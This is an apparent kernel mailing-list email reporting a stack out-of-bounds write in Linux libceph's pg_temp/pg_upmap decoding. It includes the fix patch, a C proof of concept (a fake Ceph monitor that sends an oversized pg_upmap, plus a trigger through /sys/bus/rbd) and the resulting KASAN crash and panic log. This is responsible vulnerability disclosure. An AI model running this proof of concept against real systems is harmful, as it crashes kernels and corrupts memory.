    cr.flags =3D 0;
    if (writen(fd, &cr, sizeof(cr)) <=3D 0) return;
    fprintf(stderr, "[mon] sent connect_reply READY, session OPEN\n");

    int sent_osdmap=3D0;

    /* Reactive loop: respond strictly to what the client asks. */
    for (;;) {
        uint16_t type=3D0; uint64_t tid=3D0;
        int r =3D recv_one(fd, &type, &tid);
        if (r < 0) { fprintf(stderr,"[mon] client closed\n"); break; }
        if (r =3D=3D 0) continue;
        fprintf(stderr, "[mon] recv MSG type=3D%u tid=3D%llu\n", type,
                (unsigned long long)tid);

        if (type =3D=3D CEPH_MSG_AUTH) {
            buf_t f; bufinit(&f); build_auth_reply(&f);
            send_msg(fd, CEPH_MSG_AUTH_REPLY, 1, f.b, f.len); free(f.b);
            fprintf(stderr,"[mon] sent AUTH_REPLY\n");
            /* push monmap right after auth */
            buf_t mm; bufinit(&mm); build_monmap(&mm);
            send_msg(fd, CEPH_MSG_MON_MAP, 1, mm.b, mm.len); free(mm.b);
            fprintf(stderr,"[mon] sent MON_MAP\n");
        } else if (type =3D=3D CEPH_MSG_MON_SUBSCRIBE) {
            buf_t f; bufinit(&f); build_sub_ack(&f);
            send_msg(fd, CEPH_MSG_MON_SUBSCRIBE_ACK, 1, f.b, f.len); free(f=
.b);
            fprintf(stderr,"[mon] sent SUBSCRIBE_ACK\n");
            if (!sent_osdmap) {
                buf_t o; bufinit(&o); build_osdmap_msg(&o);
                send_msg(fd, CEPH_MSG_OSD_MAP, 1, o.b, o.len); free(o.b);
                sent_osdmap=3D1;
                fprintf(stderr,"[mon] sent OSD_MAP (malicious pg_upmap
len=3D%d)\n", UPMAP_LEN);
            }
        } else if (type =3D=3D CEPH_MSG_MON_GET_VERSION) {
            /* reply with version 1 for whatever was asked (osdmap/monmap) =
*/
            buf_t f; bufinit(&f); build_get_version_reply(&f, tid, 1);
            /* MON_GET_VERSION_REPLY echoes tid in the header too */
            struct msg_header h; memset(&h,0,sizeof(h));
            h.seq=3D++g_out_seq; h.tid=3Dtid; h.type=3DCEPH_MSG_MON_GET_VER=
SION_REPLY;
            h.version=3D2; h.front_len=3Df.len; h.src_type=3DCEPH_ENTITY_TY=
PE_MON;
            h.crc=3Dcrc32c(0,&h,offsetof(struct msg_header,crc));
            struct msg_footer ft; memset(&ft,0,sizeof(ft));
            ft.front_crc=3Dcrc32c(0,f.b,f.len); ft.flags=3DCEPH_MSG_FOOTER_=
COMPLETE;
            uint8_t tag=3DCEPH_MSGR_TAG_MSG;
            writen(fd,&tag,1); writen(fd,&h,sizeof(h));
            writen(fd,f.b,f.len); writen(fd,&ft,sizeof(ft));
            free(f.b);
            fprintf(stderr,"[mon] sent GET_VERSION_REPLY tid=3D%llu\n",
                    (unsigned long long)tid);
        }
    }
}

static void *mon_thread(void *arg) {
    int port =3D (int)(long)arg;
    int s =3D socket(AF_INET, SOCK_STREAM, 0);
    int one=3D1; setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one))=
;
    struct sockaddr_in sa; memset(&sa,0,sizeof(sa));
    sa.sin_family=3DAF_INET; sa.sin_port=3Dhtons(port);
    sa.sin_addr.s_addr=3Dhtonl(0x7f000001);
    if (bind(s, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
perror("bind"); return NULL; }
    if (listen(s, 8) < 0) { perror("listen"); return NULL; }
    fprintf(stderr,"[mon] listening on 127.0.0.1:%d\n", port);
    for (;;) {
        int c =3D accept(s, NULL, NULL);
        if (c < 0) { if(errno=3D=3DEINTR) continue; break; }
        fprintf(stderr,"[mon] accepted connection\n");
        serve_client(c);
        close(c);
    }
    return NULL;
}

int main(void) {
    crc32c_init();
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    pthread_t th;
    pthread_create(&th, NULL, mon_thread, (void*)(long)MON_PORT);
    usleep(300*1000);

    /* format: <mon_addrs> <options> <pool> <image> [snap]
     * rbd defaults to single_major=3Dtrue, so add_store() rejects
/sys/bus/rbd/add
     * with -EINVAL; the real entry point is /sys/bus/rbd/add_single_major.=
 */
    const char *cmd =3D
        "127.0.0.1:6789 name=3Dadmin,ms_mode=3Dlegacy,mount_timeout=3D60 rb=
d
myimage -";

    int fd =3D open("/sys/bus/rbd/add_single_major", O_WRONLY);
    if (fd < 0) fd =3D open("/sys/bus/rbd/add", O_WRONLY);
    if (fd < 0) {
        perror("open /sys/bus/rbd/add_single_major");
        fprintf(stderr,"is rbd built-in?\n");
    } else {
        fprintf(stderr, "[poc] writing to rbd add: %s\n", cmd);
        ssize_t w =3D write(fd, cmd, strlen(cmd));
        fprintf(stderr, "[poc] rbd add write -> %zd errno=3D%d (%s)\n",
                w, errno, strerror(errno));
        close(fd);
    }

    sleep(15);
    fprintf(stderr, "[poc] done\n");
    return 0;
}
```
3) Crash Info:
```
[    2.825734] UBSAN: array-index-out-of-bounds in net/ceph/osdmap.c:2617:1=
3
[    2.826080] index 32 is out of range for type 'int [32]'
[    2.826785] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
[    2.827233] BUG: KASAN: stack-out-of-bounds in
ceph_pg_to_up_acting_osds+0x2f7c/0x37b0
[    2.827693] Write of size 4 at addr ffff888010a574f0 by task exploit/149
[    2.828121]
[    2.828224] CPU: 1 UID: 0 PID: 149 Comm: exploit Not tainted
7.1.0-rc6+ #3 PREEMPTLAZY
[    2.828233] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.or4
[    2.828238] Call Trace:
[    2.828241]  <TASK>
[    2.828243]  dump_stack_lvl+0xbc/0xf0
[    2.828251]  print_report+0xd0/0x630
[    2.828262]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
[    2.828271]  ? ceph_pg_to_up_acting_osds+0x2f7c/0x37b0
[    2.828279]  kasan_report+0xce/0x100
[    2.828291]  ? ceph_pg_to_up_acting_osds+0x2f7c/0x37b0
[    2.828300]  ceph_pg_to_up_acting_osds+0x2f7c/0x37b0
[    2.828311]  ? __pfx_ceph_pg_to_up_acting_osds+0x10/0x10
[    2.828319]  ? _raw_spin_lock_irqsave+0x95/0xf0
[    2.828327]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
[    2.828334]  ? ceph_msg_new2+0x2a1/0x4b0
[    2.828341]  ? stack_trace_save+0x93/0xd0
[    2.828350]  ? __asan_memcpy+0x3c/0x60
[    2.828360]  calc_target+0x611/0x1cf0
[    2.828367]  ? kasan_save_stack+0x42/0x60
[    2.828377]  ? kasan_save_stack+0x10/0x60
[    2.828388]  ? __pfx_calc_target+0x10/0x10
[    2.828395]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e
[    2.828405]  ? __kasan_kmalloc+0x8f/0xa0
[    2.828415]  ? __kmalloc_noprof+0x1e2/0x5d0
[    2.828424]  __submit_request+0xc8/0xc80
[    2.828434]  ceph_osdc_start_request+0x92/0xd0
[    2.828445]  ceph_osdc_call+0x510/0x850
[    2.828456]  ? __pfx_ceph_osdc_call+0x10/0x10
[    2.828466]  ? __pfx_alloc_pages_mpol+0x10/0x10
[    2.828474]  rbd_obj_method_sync.isra.0+0x1ca/0x3c0
[    2.828486]  ? __pfx_rbd_obj_method_sync.isra.0+0x10/0x10
[    2.828499]  rbd_dev_image_probe+0x66a/0x3380
[    2.828508]  ? __pfx_rbd_dev_image_probe+0x10/0x10
[    2.828518]  ? kasan_save_track+0x14/0x30
[    2.828529]  ? __asan_memcpy+0x3c/0x60
[    2.828538]  do_rbd_add+0xb3b/0x2e80
[    2.828555]  ? __pfx_do_rbd_add+0x10/0x10
[    2.828564]  ? _copy_from_iter+0x23b/0x15b0
[    2.828575]  ? __pfx__copy_from_iter+0x10/0x10
[    2.828585]  ? __pfx_add_single_major_store+0x10/0x10
[    2.828594]  bus_attr_store+0x79/0xb0
[    2.828602]  ? __pfx_bus_attr_store+0x10/0x10
[    2.828610]  sysfs_kf_write+0x21b/0x2d0
[    2.828617]  kernfs_fop_write_iter+0x42b/0x620
[    2.828629]  ? __pfx_sysfs_kf_write+0x10/0x10
[    2.828636]  vfs_write+0x6d4/0xe00
[    2.828643]  ? __pfx_kernfs_fop_write_iter+0x10/0x10
[    2.828654]  ? __pfx_vfs_write+0x10/0x10
[    2.828662]  ? __pfx_do_sys_openat2+0x10/0x10
[    2.828672]  ksys_write+0x132/0x250
[    2.828679]  ? __pfx_ksys_write+0x10/0x10
[    2.828687]  do_syscall_64+0xdc/0x520
[    2.828695]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[    2.828702] RIP: 0033:0x42708d
[    2.828707] Code: e5 48 83 ec 20 48 89 55 e8 48 89 75 f0 89 7d f8
e8 c8 fb 02 00 48 8b 55 e8 48 8b 75 f0 41 89 c0 8b
[    2.828714] RSP: 002b:00007ffc9038da60 EFLAGS: 00000293 ORIG_RAX:
0000000000000001
[    2.828721] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 00000000004=
2708d
[    2.828725] RDX: 0000000000000047 RSI: 000000000049b240 RDI: 00000000000=
00005
[    2.828730] RBP: 00007ffc9038da80 R08: 0000000000000000 R09: 00000000000=
00000
[    2.828734] R10: 0000000000000000 R11: 0000000000000293 R12: 00007ffc903=
8dbe8
[    2.828738] R13: 00007ffc9038dbf8 R14: 00000000004c4848 R15: 00000000000=
00001
[    2.828744]  </TASK>
[    2.828746]
[    2.846009] The buggy address belongs to stack of task exploit/149
[    2.846349]  and is located at offset 232 in frame:
[    2.846609]  calc_target+0x0/0x1cf0
[    2.846796]
[    2.846883] This frame has 4 objects:
[    2.847117]  [32, 48) 'pgid'
[    2.847122]  [64, 80) 'last_pgid'
[    2.847292]  [96, 232) 'up'
[    2.847481]  [304, 440) 'acting'
[    2.847649]
[    2.847906] The buggy address belongs to the physical page:
[    2.848224]
[    2.848313] Memory state around the buggy address:
[    2.848573]  ffff888010a57380: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00
[    2.848962]  ffff888010a57400: 00 f1 f1 f1 f1 00 00 f2 f2 00 00 f2
f2 00 00 00
[    2.849346] >ffff888010a57480: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 f2 f2
[    2.849728]                                                             =
 ^
[    2.850104]  ffff888010a57500: f2 f2 f2 f2 f2 f2 f2 00 00 00 00 00
00 00 00 00
[    2.850456]  ffff888010a57580: 00 00 00 00 00 00 00 00 f3 f3 f3 f3
f3 f3 f3 f3
[    2.850806] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
[    2.851354] kernel BUG at net/ceph/osdmap.c:2670!
[    2.851611] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[    2.851881] CPU: 1 UID: 0 PID: 149 Comm: exploit Tainted: G    B
           7.1.0-rc6+ #3 PREEMPTLAZY
[    2.852389] Tainted: [B]=3DBAD_PAGE
[    2.852571] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.or4
[    2.853170] RIP: 0010:ceph_pg_to_up_acting_osds+0x2e2c/0x37b0
[    2.853483] Code: af ee ff ff e8 b5 e6 34 fb 48 8b 44 24 30 8b 98
80 00 00 00 e9 26 ee ff ff e8 a0 e6 34 fb 0f 0b e8
[    2.854447] RSP: 0018:ffff888010a571d0 EFLAGS: 00010293
[    2.854730] RAX: 0000000000000000 RBX: 0000000041414141 RCX: ffffffff867=
a1dc8
[    2.855134] RDX: ffff88800ff4cc00 RSI: ffffffff867a3e0c RDI: 00000000000=
00005
[    2.855492] RBP: 0000000000000040 R08: 0000000000000005 R09: 00000000fff=
fffff
[    2.855858] R10: 0000000041414141 R11: 3d3d3d3d3d3d3d3d R12: ffff888010a=
57568
[    2.856243] R13: ffff88800fdbe52c R14: ffff88800fdbe400 R15: 00000000000=
00040
[    2.856606] FS:  000000002e6be3c0(0000) GS:ffff888177085000(0000)
knlGS:0000000000000000
[    2.857038] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    2.857327] CR2: 00007f9184ae4d58 CR3: 0000000010a6d003 CR4: 00000000007=
72ef0
[    2.857695] PKRU: 55555554
[    2.857834] Call Trace:
[    2.857985]  <TASK>
[    2.858102]  ? __pfx_ceph_pg_to_up_acting_osds+0x10/0x10
[    2.858371]  ? _raw_spin_lock_irqsave+0x95/0xf0
[    2.858607]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
[    2.858865]  ? ceph_msg_new2+0x2a1/0x4b0
[    2.859097]  ? stack_trace_save+0x93/0xd0
[    2.859307]  ? __asan_memcpy+0x3c/0x60
[    2.859517]  calc_target+0x611/0x1cf0
[    2.859728]  ? kasan_save_stack+0x42/0x60
[    2.859983]  ? kasan_save_stack+0x10/0x60
[    2.860202]  ? __pfx_calc_target+0x10/0x10
[    2.860420]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e
[    2.860711]  ? __kasan_kmalloc+0x8f/0xa0
[    2.860963]  ? __kmalloc_noprof+0x1e2/0x5d0
[    2.861198]  __submit_request+0xc8/0xc80
[    2.861402]  ceph_osdc_start_request+0x92/0xd0
[    2.861626]  ceph_osdc_call+0x510/0x850
[    2.861828]  ? __pfx_ceph_osdc_call+0x10/0x10
[    2.862078]  ? __pfx_alloc_pages_mpol+0x10/0x10
[    2.862302]  rbd_obj_method_sync.isra.0+0x1ca/0x3c0
[    2.862560]  ? __pfx_rbd_obj_method_sync.isra.0+0x10/0x10
[    2.862846]  rbd_dev_image_probe+0x66a/0x3380
[    2.863111]  ? __pfx_rbd_dev_image_probe+0x10/0x10
[    2.863386]  ? kasan_save_track+0x14/0x30
[    2.863600]  ? __asan_memcpy+0x3c/0x60
[    2.863798]  do_rbd_add+0xb3b/0x2e80
[    2.864020]  ? __pfx_do_rbd_add+0x10/0x10
[    2.864233]  ? _copy_from_iter+0x23b/0x15b0
[    2.864468]  ? __pfx__copy_from_iter+0x10/0x10
[    2.864718]  ? __pfx_add_single_major_store+0x10/0x10
[    2.865001]  bus_attr_store+0x79/0xb0
[    2.865184]  ? __pfx_bus_attr_store+0x10/0x10
[    2.865398]  sysfs_kf_write+0x21b/0x2d0
[    2.865601]  kernfs_fop_write_iter+0x42b/0x620
[    2.865819]  ? __pfx_sysfs_kf_write+0x10/0x10
[    2.866061]  vfs_write+0x6d4/0xe00
[    2.866243]  ? __pfx_kernfs_fop_write_iter+0x10/0x10
[    2.866508]  ? __pfx_vfs_write+0x10/0x10
[    2.866710]  ? __pfx_do_sys_openat2+0x10/0x10
[    2.866944]  ksys_write+0x132/0x250
[    2.867122]  ? __pfx_ksys_write+0x10/0x10
[    2.867322]  do_syscall_64+0xdc/0x520
[    2.867502]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[    2.867750] RIP: 0033:0x42708d
[    2.867908] Code: e5 48 83 ec 20 48 89 55 e8 48 89 75 f0 89 7d f8
e8 c8 fb 02 00 48 8b 55 e8 48 8b 75 f0 41 89 c0 8b
[    2.868812] RSP: 002b:00007ffc9038da60 EFLAGS: 00000293 ORIG_RAX:
0000000000000001
[    2.869183] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 00000000004=
2708d
[    2.869522] RDX: 0000000000000047 RSI: 000000000049b240 RDI: 00000000000=
00005
[    2.869878] RBP: 00007ffc9038da80 R08: 0000000000000000 R09: 00000000000=
00000
[    2.870258] R10: 0000000000000000 R11: 0000000000000293 R12: 00007ffc903=
8dbe8
[    2.870597] R13: 00007ffc9038dbf8 R14: 00000000004c4848 R15: 00000000000=
00001
[    2.870971]  </TASK>
[    2.871087] Modules linked in:
[    2.871273] ---[ end trace 0000000000000000 ]---
[    2.871520] RIP: 0010:ceph_pg_to_up_acting_osds+0x2e2c/0x37b0
[    2.871825] Code: af ee ff ff e8 b5 e6 34 fb 48 8b 44 24 30 8b 98
80 00 00 00 e9 26 ee ff ff e8 a0 e6 34 fb 0f 0b e8
[    2.872741] RSP: 0018:ffff888010a571d0 EFLAGS: 00010293
[    2.873032] RAX: 0000000000000000 RBX: 0000000041414141 RCX: ffffffff867=
a1dc8
[    2.873368] RDX: ffff88800ff4cc00 RSI: ffffffff867a3e0c RDI: 00000000000=
00005
[    2.873702] RBP: 0000000000000040 R08: 0000000000000005 R09: 00000000fff=
fffff
[    2.874087] R10: 0000000041414141 R11: 3d3d3d3d3d3d3d3d R12: ffff888010a=
57568
[    2.874446] R13: ffff88800fdbe52c R14: ffff88800fdbe400 R15: 00000000000=
00040
[    2.874794] FS:  000000002e6be3c0(0000) GS:ffff888177085000(0000)
knlGS:0000000000000000
[    2.875220] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    2.875520] CR2: 00007f9184ae4d58 CR3: 0000000010a6d003 CR4: 00000000007=
72ef0
[    2.875883] PKRU: 55555554
[    2.876043] Kernel panic - not syncing: Fatal exception
[    2.877628] Kernel Offset: disabled
```

We are glad to help if you have any questions.

Thanks,
Xiang




On Mon, Jun 8, 2026 at 9:40=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
>
> Thanks for your attention to this bug. We have a PoC that can trigger
> the KASAN crash. Please DM if you need it to reproduce the issue.
>
> Xiang
>
> On Mon, Jun 8, 2026 at 9:40=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
> >
> > __decode_pg_temp() decodes an user-controlled length but only rejects
> > values large enough to overflow the allocation; it does not bound it to
> > CEPH_PG_MAX_SIZE. The helper backs both pg_temp and pg_upmap decoding, =
and
> > apply_upmap()/get_temp_osds() later copy the decoded list into the fixe=
d-size
> > on-stack array struct ceph_osds.osds[CEPH_PG_MAX_SIZE]. A monitor that =
sends
> > an OSDMap with a pg_temp/pg_upmap entry longer than 32 thus causes a st=
ack
> > out-of-bounds write.
> >
> > An OSD set for a single PG can never exceed CEPH_PG_MAX_SIZE, so reject=
 longer
> > entries at decode time. The bound is well below the old overflow thresh=
old, so
> > it also covers the allocation-size overflow the previous check guarded =
against.
> >
> >   BUG: KASAN: stack-out-of-bounds in ceph_pg_to_up_acting_osds
> >   Write of size 4 ... by task exploit
> >    kasan_report (mm/kasan/report.c:595)
> >    ceph_pg_to_up_acting_osds (net/ceph/osdmap.c:2617 net/ceph/osdmap.c:=
2833)
> >    calc_target (net/ceph/osd_client.c:1638)
> >    __submit_request (net/ceph/osd_client.c:2394)
> >    ceph_osdc_start_request (net/ceph/osd_client.c:2490)
> >    ceph_osdc_call (net/ceph/osd_client.c:5164)
> >    rbd_dev_image_probe (drivers/block/rbd.c:6899)
> >    do_rbd_add (drivers/block/rbd.c:7138)
> >    ...
> >   kernel BUG at net/ceph/osdmap.c:2670!
> >
> > Fixes: a303bb0e5834 ("libceph: introduce and switch to decode_pg_mappin=
g()")
> > Reported-by: Weiming Shi <bestswngs@gmail.com>
> > Assisted-by: Claude:claude-opus-4-8
> > Signed-off-by: Xiang Mei <xmei5@asu.edu>
> > ---
> >  net/ceph/osdmap.c | 2 +-
> >  1 file changed, 1 insertion(+), 1 deletion(-)
> >
> > diff --git a/net/ceph/osdmap.c b/net/ceph/osdmap.c
> > index 8b5b0587a0cf..e35d8abe1773 100644
> > --- a/net/ceph/osdmap.c
> > +++ b/net/ceph/osdmap.c
> > @@ -1436,7 +1436,7 @@ static struct ceph_pg_mapping *__decode_pg_temp(v=
oid **p, void *end,
> >         ceph_decode_32_safe(p, end, len, e_inval);
> >         if (len =3D=3D 0 && incremental)
> >                 return NULL;    /* new_pg_temp: [] to remove */
> > -       if ((size_t)len > (SIZE_MAX - sizeof(*pg)) / sizeof(u32))
> > +       if (len > CEPH_PG_MAX_SIZE)
> >                 return ERR_PTR(-EINVAL);
> >
> >         ceph_decode_need(p, end, len * sizeof(u32), e_inval);
> > --
> > 2.43.0
> >
